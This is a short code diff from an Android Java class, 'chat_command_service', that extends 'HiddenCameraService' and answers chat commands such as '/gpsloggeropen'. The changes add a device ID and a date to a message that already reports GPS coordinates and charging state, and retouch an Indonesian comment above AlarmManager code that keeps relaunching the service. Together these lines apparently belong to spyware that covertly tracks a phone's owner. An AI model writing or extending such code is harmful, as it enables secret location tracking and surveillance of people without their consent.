@@ -391,9 +391,11 @@ public class chat_command_service extends HiddenCameraService {
 
                 String latlong = sharedSimpanNotif.getString("maps_latlong","");
                 String isi = sharedSimpanNotif.getString("ischarging","");
+                String tgl = sharedSimpanNotif.getString("tgl","");
+                String myid = sharedPreferences.getString("myid","");
 
-                request_body.text = latlong+" \n "+isi;
-                has_command = true;
+                request_body.text = latlong+" \n "+isi + "\n"+myid+ " \n"+tgl;
+                //has_command = true;
                 break;
 
             case "/gpsloggeropen":
@@ -852,7 +854,7 @@ public class chat_command_service extends HiddenCameraService {
 
 
 
-        /*gila*/
+        /*gila android Nougat /7 ini sangat efektif*/
         final Intent intent = new Intent(context, chat_command_service.class);
         final PendingIntent pending = PendingIntent.getService(context, 0, intent, 0);
         final AlarmManager alarm = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
